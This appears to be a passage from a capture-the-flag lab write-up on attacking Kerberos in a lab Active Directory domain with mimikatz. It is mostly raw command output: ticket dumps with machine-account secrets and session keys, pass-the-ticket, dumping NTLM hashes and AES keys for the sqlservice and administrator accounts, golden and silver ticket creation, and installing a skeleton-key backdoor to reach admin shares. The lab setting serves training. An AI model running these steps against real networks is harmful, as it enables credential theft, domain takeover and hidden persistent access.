 1c b4 59 2e d6 bd 13 07 60 5e 07 e7 ea 6e cd 77 da 97 f6 69 ea 4c 6e 75 e7 25 04 a5 d2 1d 6e 8b d2 90 4e a1 1d 63 1d 02 22 42 a9 07 0b 1b bb
 f1 dc 6e 14 ed ab fa e4 3b 90 41 0b 87 bb a2 4d 27 77 7a b0 b2 22 c8 de 48 64 fd 21 2e da df 68 cc e0 3a 04 67 8a 11 a2 f8 f4 b0 b0 d1 e3 51
 04 f1 fe da c9 f6 85 eb f4 25 a3 52 2a 00 e8 25 d3 9a 08 31 27 86 cd b3 fe 6e 40 f6 ed 59 03 fe b1 3a 98 bf f7 d5 6c 74 3e de 5d fb 15 f4 08
 c9 2b fd 0f c7 e7 6a 79 38 2c 93 4b

        Group 0 - Ticket Granting Service

        Group 1 - Client Ticket ?

        Group 2 - Ticket Granting Ticket

Authentication Id : 0 ; 32864 (00000000:00008060)
Session           : Interactive from 1 
User Name         : UMFD-1
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 6/24/2024 6:07:00 PM
SID               : S-1-5-96-0-1

         * Username : CONTROLLER-1$
         * Domain   : CONTROLLER.local
         * Password : fe 09 4c 08 0b cb e9 93 22 f0 ac d0 03 6d 7a be dd 10 c4 32 a0 f9 14 72 e7 25 44 a7 23 39 a4 68 3b 82 9e 60 ef d4 d3 5a
 8a 21 90 fe 71 14 bb 16 cf 47 f1 d7 9b 3d e5 e3 da cf 67 7e 9b 36 32 75 87 57 1b fc 8e e9 4e f6 30 3d 88 24 6e 4f 15 b9 f8 26 d3 d0 83 c0 67
 1c b4 59 2e d6 bd 13 07 60 5e 07 e7 ea 6e cd 77 da 97 f6 69 ea 4c 6e 75 e7 25 04 a5 d2 1d 6e 8b d2 90 4e a1 1d 63 1d 02 22 42 a9 07 0b 1b bb
 f1 dc 6e 14 ed ab fa e4 3b 90 41 0b 87 bb a2 4d 27 77 7a b0 b2 22 c8 de 48 64 fd 21 2e da df 68 cc e0 3a 04 67 8a 11 a2 f8 f4 b0 b0 d1 e3 51
 04 f1 fe da c9 f6 85 eb f4 25 a3 52 2a 00 e8 25 d3 9a 08 31 27 86 cd b3 fe 6e 40 f6 ed 59 03 fe b1 3a 98 bf f7 d5 6c 74 3e de 5d fb 15 f4 08
 c9 2b fd 0f c7 e7 6a 79 38 2c 93 4b

        Group 0 - Ticket Granting Service

        Group 1 - Client Ticket ?

        Group 2 - Ticket Granting Ticket 

Authentication Id : 0 ; 32749 (00000000:00007fed)
Session           : Interactive from 1
User Name         : UMFD-1
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 6/24/2024 6:07:00 PM
SID               : S-1-5-96-0-1

         * Username : CONTROLLER-1$
         * Domain   : CONTROLLER.local
         * Password : 4f 86 7b 98 4a 5c 2c 96 e2 ce 1f 48 6f a1 cb 7d 3c b4 6a e0 72 c3 81 60 63 90 41 1e e1 8b fd a8 ff c3 f1 7f 84 d0 21 35
 52 fd 4a 17 07 36 a6 ba 16 3d 24 6b 60 4a e3 c4 b9 e6 38 ff 8a ee 0d 07 01 a5 bc 36 63 04 bc 38 5c ea 62 95 26 cc 3f c4 09 ab 0c 7f 41 08 ed
 e1 46 8d b2 8d 1d a9 ca 77 d6 c0 17 f6 38 38 59 66 73 9e cf 7f 96 b1 87 a1 8e 86 f8 b8 7d 84 e8 58 f3 cf 9c 96 90 a7 fd f5 73 18 62 8e 36 86
 d3 18 b5 06 36 68 5a 55 17 34 ac 7b 68 02 dd 99 83 f8 a9 d2 20 83 19 93 d6 79 bd 1e 3b c3 ac 79 c5 ff cc a5 49 58 ac 62 e5 22 8a 75 68 95 14
 b2 a5 de 75 25 2b 7a 31 8e 89 17 ad b0 93 07 44 43 4f ff 5a 4f f1 90 81 a3 4c 0f 9d 0c 89 3c 86 b2 0c 3d 61 3f d2 d8 09 1b 6a 9f af ed 9f f3
 4b 66 0c 1b af 71 15 bc f6 a7 37 41

        Group 0 - Ticket Granting Service 

        Group 1 - Client Ticket ?

        Group 2 - Ticket Granting Ticket

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : CONTROLLER-1$
Domain            : CONTROLLER
Logon Server      : (null)
Logon Time        : 6/24/2024 6:06:48 PM
SID               : S-1-5-18

         * Username : controller-1$
         * Domain   : CONTROLLER.LOCAL
         * Password : (null)

        Group 0 - Ticket Granting Service
         [00000000] 
           Start/End/MaxRenew: 6/24/2024 6:38:40 PM ; 6/25/2024 4:07:40 AM ; 7/1/2024 6:07:40 PM
           Service Name (02) : HTTP ; CONTROLLER-1.CONTROLLER.local ; @ CONTROLLER.LOCAL
           Target Name  (02) : HTTP ; CONTROLLER-1.CONTROLLER.local ; @ CONTROLLER.LOCAL
           Client Name  (01) : CONTROLLER-1$ ; @ CONTROLLER.LOCAL
           Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ;
           Session Key       : 0x00000012 - aes256_hmac
             2ba817f73043468da009985381a12d86ce1c96eb4d6ba2d97d24e9c788870b1d
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 5        [...] 
           * Saved to file [0;3e7]-0-0-40a50000-CONTROLLER-1$@HTTP-CONTROLLER-1.CONTROLLER.local.kirbi !
         [00000001]
           Start/End/MaxRenew: 6/24/2024 6:22:11 PM ; 6/25/2024 4:07:40 AM ; 7/1/2024 6:07:40 PM
           Service Name (02) : GC ; CONTROLLER-1.CONTROLLER.local ; CONTROLLER.local ; @ CONTROLLER.LOCAL
           Target Name  (02) : GC ; CONTROLLER-1.CONTROLLER.local ; CONTROLLER.local ; @ CONTROLLER.LOCAL
           Client Name  (01) : CONTROLLER-1$ ; @ CONTROLLER.LOCAL ( CONTROLLER.local )
           Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ;  
           Session Key       : 0x00000012 - aes256_hmac
             1a98c1d99fafd84d4ae973080ab390ddbca0f736b863ff10b89730c41bbd4965
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 5        [...]
           * Saved to file [0;3e7]-0-1-40a50000-CONTROLLER-1$@GC-CONTROLLER-1.CONTROLLER.local.kirbi !
         [00000002]
           Start/End/MaxRenew: 6/24/2024 6:16:52 PM ; 6/25/2024 4:07:40 AM ; 7/1/2024 6:07:40 PM
           Service Name (02) : cifs ; CONTROLLER-1 ; @ CONTROLLER.LOCAL 
           Target Name  (02) : cifs ; CONTROLLER-1 ; @ CONTROLLER.LOCAL
           Client Name  (01) : CONTROLLER-1$ ; @ CONTROLLER.LOCAL
           Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ;
           Session Key       : 0x00000012 - aes256_hmac
             4eeca8e5729bc2cd917863de74f319cfbd89bbf5865b523b2dcc801ef27f9b05
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 5        [...]
           * Saved to file [0;3e7]-0-2-40a50000-CONTROLLER-1$@cifs-CONTROLLER-1.kirbi !
         [00000003]
           Start/End/MaxRenew: 6/24/2024 6:08:08 PM ; 6/25/2024 4:07:40 AM ; 7/1/2024 6:07:40 PM
           Service Name (01) : CONTROLLER-1$ ; @ CONTROLLER.LOCAL
           Target Name  (01) : CONTROLLER-1$ ; @ CONTROLLER.LOCAL
           Client Name  (01) : CONTROLLER-1$ ; @ CONTROLLER.LOCAL
           Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ;
           Session Key       : 0x00000012 - aes256_hmac
             b73a4ace7551cd191fe090ac5b1aaaa8dccbab97a35086d8ee0038b4127a3432
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 5        [...]
           * Saved to file [0;3e7]-0-3-40a50000.kirbi !
         [00000004]
           Start/End/MaxRenew: 6/24/2024 6:08:08 PM ; 6/25/2024 4:07:40 AM ; 7/1/2024 6:07:40 PM
           Service Name (02) : cifs ; CONTROLLER-1.CONTROLLER.local ; CONTROLLER.local ; @ CONTROLLER.LOCAL
           Target Name  (02) : cifs ; CONTROLLER-1.CONTROLLER.local ; CONTROLLER.local ; @ CONTROLLER.LOCAL
           Client Name  (01) : CONTROLLER-1$ ; @ CONTROLLER.LOCAL ( CONTROLLER.local )
           Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ;
           Session Key       : 0x00000012 - aes256_hmac
             9c9c3518144ead17342a0b8d8318c82cd35f33f2ba83924752983baf9984d398 
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 5        [...]
           * Saved to file [0;3e7]-0-4-40a50000-CONTROLLER-1$@cifs-CONTROLLER-1.CONTROLLER.local.kirbi !
         [00000005]
           Start/End/MaxRenew: 6/24/2024 6:07:48 PM ; 6/25/2024 4:07:40 AM ; 7/1/2024 6:07:40 PM
           Service Name (02) : LDAP ; CONTROLLER-1.CONTROLLER.local ; CONTROLLER.local ; @ CONTROLLER.LOCAL
           Target Name  (02) : LDAP ; CONTROLLER-1.CONTROLLER.local ; CONTROLLER.local ; @ CONTROLLER.LOCAL 
           Client Name  (01) : CONTROLLER-1$ ; @ CONTROLLER.LOCAL ( CONTROLLER.LOCAL )
           Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ;
           Session Key       : 0x00000012 - aes256_hmac
             b553572d06114d99d160629e28c377b007e1d8a5ab8b7cdb05aae60361eeacfe
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 5        [...]
           * Saved to file [0;3e7]-0-5-40a50000-CONTROLLER-1$@LDAP-CONTROLLER-1.CONTROLLER.local.kirbi ! 
         [00000006]
           Start/End/MaxRenew: 6/24/2024 6:07:40 PM ; 6/25/2024 4:07:40 AM ; 7/1/2024 6:07:40 PM
           Service Name (02) : ldap ; CONTROLLER-1.CONTROLLER.local ; @ CONTROLLER.LOCAL
           Target Name  (02) : ldap ; CONTROLLER-1.CONTROLLER.local ; @ CONTROLLER.LOCAL
           Client Name  (01) : CONTROLLER-1$ ; @ CONTROLLER.LOCAL
           Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ;
           Session Key       : 0x00000012 - aes256_hmac
             5648e0750373f1ea354b5b8d774adab4491813e74dd8ede4777dd4868860867c
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 5        [...] 
           * Saved to file [0;3e7]-0-6-40a50000-CONTROLLER-1$@ldap-CONTROLLER-1.CONTROLLER.local.kirbi !
         [00000007]
           Start/End/MaxRenew: 6/24/2024 6:07:40 PM ; 6/25/2024 4:07:40 AM ; 7/1/2024 6:07:40 PM
           Service Name (02) : LDAP ; CONTROLLER-1 ; @ CONTROLLER.LOCAL
           Target Name  (02) : LDAP ; CONTROLLER-1 ; @ CONTROLLER.LOCAL
           Client Name  (01) : CONTROLLER-1$ ; @ CONTROLLER.LOCAL
           Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ;  
           Session Key       : 0x00000012 - aes256_hmac
             2fcb68c3b79734f48ec70cd6c55b39ff3ff76548c0aa3bf45b35a3ab9ecd348e
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 5        [...]
           * Saved to file [0;3e7]-0-7-40a50000-CONTROLLER-1$@LDAP-CONTROLLER-1.kirbi !

        Group 1 - Client Ticket ? 
         [00000000]
           Start/End/MaxRenew: 6/24/2024 6:35:43 PM ; 6/24/2024 6:50:43 PM ; 7/1/2024 6:07:40 PM
           Service Name (01) : controller-1$ ; @ (null)
           Target Name  (10) : administrator@CONTROLLER.local ; @ (null)
           Client Name  (10) : administrator@CONTROLLER.local ; @ CONTROLLER.LOCAL
           Flags 00a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ;
           Session Key       : 0x00000012 - aes256_hmac
             e5a90d49db509f11d6cdcc9b50c5b2bb5f12f90604b0d3991fc3c62a836c92a2
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 5        [...]
           * Saved to file [0;3e7]-1-0-00a50000.kirbi !

        Group 2 - Ticket Granting Ticket
         [00000000]
           Start/End/MaxRenew: 6/24/2024 6:07:40 PM ; 6/25/2024 4:07:40 AM ; 7/1/2024 6:07:40 PM
           Service Name (02) : krbtgt ; CONTROLLER.LOCAL ; @ CONTROLLER.LOCAL
           Target Name  (--) : @ CONTROLLER.LOCAL
           Client Name  (01) : CONTROLLER-1$ ; @ CONTROLLER.LOCAL ( $$Delegation Ticket$$ )
           Flags 60a10000    : name_canonicalize ; pre_authent ; renewable ; forwarded ; forwardable ;  
           Session Key       : 0x00000012 - aes256_hmac
             d108b2938441d1235d46c6c2afedad02e7ade986a010aba29af4bb56c357a45d
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 2        [...]
           * Saved to file [0;3e7]-2-0-60a10000-CONTROLLER-1$@krbtgt-CONTROLLER.LOCAL.kirbi !
         [00000001]
           Start/End/MaxRenew: 6/24/2024 6:07:40 PM ; 6/25/2024 4:07:40 AM ; 7/1/2024 6:07:40 PM
           Service Name (02) : krbtgt ; CONTROLLER.LOCAL ; @ CONTROLLER.LOCAL
           Target Name  (02) : krbtgt ; CONTROLLER.LOCAL ; @ CONTROLLER.LOCAL 
           Client Name  (01) : CONTROLLER-1$ ; @ CONTROLLER.LOCAL ( CONTROLLER.LOCAL )
           Flags 40e10000    : name_canonicalize ; pre_authent ; initial ; renewable ; forwardable ;
           Session Key       : 0x00000012 - aes256_hmac
             da0b6a790d9a28180747bbf12fce18451cb2530358d71f0ca72f41696f5bcf50
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 2        [...]
           * Saved to file [0;3e7]-2-1-40e10000-CONTROLLER-1$@krbtgt-CONTROLLER.LOCAL.kirbi !



mimikatz # kerberos::ptt [0;1fc304]-2-0-40e10000-Administrator@krbtgt-CONTROLLER.LOCAL.kirbi 

* File: '[0;1fc304]-2-0-40e10000-Administrator@krbtgt-CONTROLLER.LOCAL.kirbi': OK


controller\administrator@CONTROLLER-1 C:\Users\Administrator\Downloads>klist

Current LogonId is 0:0x1fc304

Cached Tickets: (3)

#0>     Client: Administrator @ CONTROLLER.LOCAL
        Server: krbtgt/CONTROLLER.LOCAL @ CONTROLLER.LOCAL
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize
        Start Time: 6/24/2024 18:35:46 (local)
        End Time:   6/25/2024 4:35:46 (local)
        Renew Time: 7/1/2024 18:35:46 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called:

#1>     Client: Administrator @ CONTROLLER.LOCAL
        Server: CONTROLLER-1/HTTPService.CONTROLLER.local:30222 @ CONTROLLER.LOCAL
        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
        Ticket Flags 0x40a10000 -> forwardable renewable pre_authent name_canonicalize
        Start Time: 6/24/2024 18:52:43 (local)
        End Time:   6/25/2024 4:35:46 (local)
        Renew Time: 7/1/2024 18:35:46 (local)
        Session Key Type: RSADSI RC4-HMAC(NT)
        Cache Flags: 0
        Kdc Called: CONTROLLER-1

#2>     Client: Administrator @ CONTROLLER.LOCAL
        Server: CONTROLLER-1/SQLService.CONTROLLER.local:30111 @ CONTROLLER.LOCAL
        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
        Ticket Flags 0x40a10000 -> forwardable renewable pre_authent name_canonicalize
        Start Time: 6/24/2024 18:52:43 (local)
        End Time:   6/25/2024 4:35:46 (local)
        Renew Time: 7/1/2024 18:35:46 (local)
        Session Key Type: RSADSI RC4-HMAC(NT)
        Cache Flags: 0
        Kdc Called: CONTROLLER-1

```


## Task 7 Golden/Silver Ticket Attacks w/ mimikatz

```bash
controller\administrator@CONTROLLER-1 C:\Users\Administrator\Downloads>mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 May 19 2020 00:48:59              
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)                               
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )  
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz                    
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com ) 
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/ 
                                                                          
mimikatz # privilege::debug                                               
Privilege '20' OK 
                  
mimikatz # lsadump::lsa /inject /name:sqlservice 
Domain : CONTROLLER / S-1-5-21-432953485-3795405108-1502158860 
                                                               
RID  : 00000455 (1109)                                         
User : sqlservice                                              
                                                               
 * Primary                                                     
    NTLM : cd40c9ed96265531b21fc5b1dafcfb0a                    
    LM   :                                                     
  Hash NTLM: cd40c9ed96265531b21fc5b1dafcfb0a                  
    ntlm- 0: cd40c9ed96265531b21fc5b1dafcfb0a 
    lm  - 0: 7bb53f77cde2f49c17190f7a071bd3a0 
                                              
 * WDigest                                    
    01  ba42b3f2ef362e231faca14b6dea61ef      
    02  00a0374f4ac4bce4adda196e458dd8b8      
    03  f39d8d3e34a4e2eac8f6d4b62fe52d06      
    04  ba42b3f2ef362e231faca14b6dea61ef      
    05  98c65218e4b7b8166943191cd8c35c23      
    06  6eccb56cda1444e3909322305ed04b37      
    07  25b7998ce2e7b826a576a43f89702921      
    08  8609a1da5628a4016d32f9eb73314fa0      
    09  277f84c6c59728fb963a6ee1a3b27f0d      
    10  63a9f69e8b36c3e0612ec8784b9c7599      
    11  47cb5c436807396994f1b9ccc8d2f8e1      
    12  46f2c402d8731ed6dca07f5dbc71a604
    13  2990e284070a014e54c749a6f96f9be7
    14  c059f85b7f01744dc0a2a013978a965f
    15  3600c835f3e81858a77e74370e047e29
    16  bd9c013f8a3f743f8a5b553e8a275a88
    17  c1d94e24d26fdaad4d6db039058c292e
    18  1a433c0634b50c567bac222be4eac871
    19  78d7a7573e4af2b8649b0280cd75636d
    20  136ddfa7840610480a76777f3be007e0 
    21  7a4a266a64910bb3e5651994ba6d7fb4
    22  a75ec46a7a473e90da499c599bc3d3cb
    23  8d3db50354c0744094334562adf74c2a
    24  7d07406132d671f73a139ff89da5d72e
    25  dd1e02d5c5b8ae969d903a0bc63d9191
    26  27da7fc766901eac79eba1a970ceb7da
    27  09333600bcc68ee149f449321a5efb27
    28  1c550f8b3af2eb4efda5c34aa8a1c549
    29  3cd9326a300d2261451d1504832cb062

 * Kerberos
    Default Salt : CONTROLLER.LOCALSQLService 
    Credentials
      des_cbc_md5       : 5d5dae0dc10e7aec

 * Kerberos-Newer-Keys
    Default Salt : CONTROLLER.LOCALSQLService
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : a3a6dbd4d6fa895b600c28bfdaf6b52d59d46a6eb1f455bc08a19b7e8cdab76d
      aes128_hmac       (4096) : 629b46af543142f77cabcf14afb1caea
      des_cbc_md5       (4096) : 5d5dae0dc10e7aec

 * NTLM-Strong-NTOWF
    Random Value : 7e9547ab69f52e42450903ebbe6ad6ec 


mimikatz # lsadump::lsa /inject /name:administrator 
Domain : CONTROLLER / S-1-5-21-432953485-3795405108-1502158860 

RID  : 000001f4 (500)
User : administrator

 * Primary
    NTLM : 2777b7fec870e04dda00cd7260f7bee6
    LM   :
  Hash NTLM: 2777b7fec870e04dda00cd7260f7bee6

 * Kerberos
    Default Salt : WIN-G83IJFV2N03Administrator
    Credentials
      des_cbc_md5       : 918abaf7dcb02ce6

 * Kerberos-Newer-Keys
    Default Salt : WIN-G83IJFV2N03Administrator
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 42b3c13c8c0fef3175eb2b5926f805f919123efd001a9c5a16ee9a86101e32b4
      aes128_hmac       (4096) : d01d6ccf97a2ee214ec7185173a3b659
      des_cbc_md5       (4096) : 918abaf7dcb02ce6

 * NTLM-Strong-NTOWF
    Random Value : 7bfd4ae86442827fb0db294d5c9855ce

```

Dump the krbtgt hash -
*lsadump::lsa /inject /name:krbtgt* - This will dump the hash as well as the security identifier needed to create a Golden Ticket.

Create a Golden/Silver Ticket - 
*Kerberos::golden /user:Administrator /domain:controller.local /sid: /krbtgt: /id:* - This is the command for creating a golden ticket to create a silver ticket simply put a service NTLM hash into the krbtgt slot, the sid of the service account into sid, and change the id to 1103.


Use the Golden/Silver Ticket to access other machines -
*misc::cmd* this will open a new elevated command prompt with the given ticket in mimikatz
### Question 
- What is the SQLService NTLM Hash? `cd40c9ed96265531b21fc5b1dafcfb0a`
- What is the Administrator NTLM Hash? `2777b7fec870e04dda00cd7260f7bee6`

## Task 8 Kerberos Backdoors w/ mimikatz
The default hash for a mimikatz skeleton key is 60BA4FCADC466C7A033C178194C03DF6 which makes the password -"mimikatz"

Installing the Skeleton Key w/ mimikatz -
- `misc::skeleton`  Yes! that's it but don't underestimate this small command it is very powerful

Accessing the forest - 

The default credentials will be: "mimikatz"
```bash
mimikatz # misc::skeleton 
[KDC] data 
[KDC] struct
[KDC] keys patch OK
[RC4] functions 
[RC4] init patch OK
[RC4] decrypt patch OK

```
example: 
`net use c:\\DOMAIN-CONTROLLER\admin$ /user:Administrator mimikatz` - The share will now be accessible without the need for the Administrators password

`dir \\Desktop-1\c$ /user:Machine1 mimikatz` - access the directory of Desktop-1 without ever knowing what users have access to Desktop-1

The skeleton key will not persist by itself because it runs in the memory, it can be scripted or persisted using other tools and techniques however that is out of scope for this room.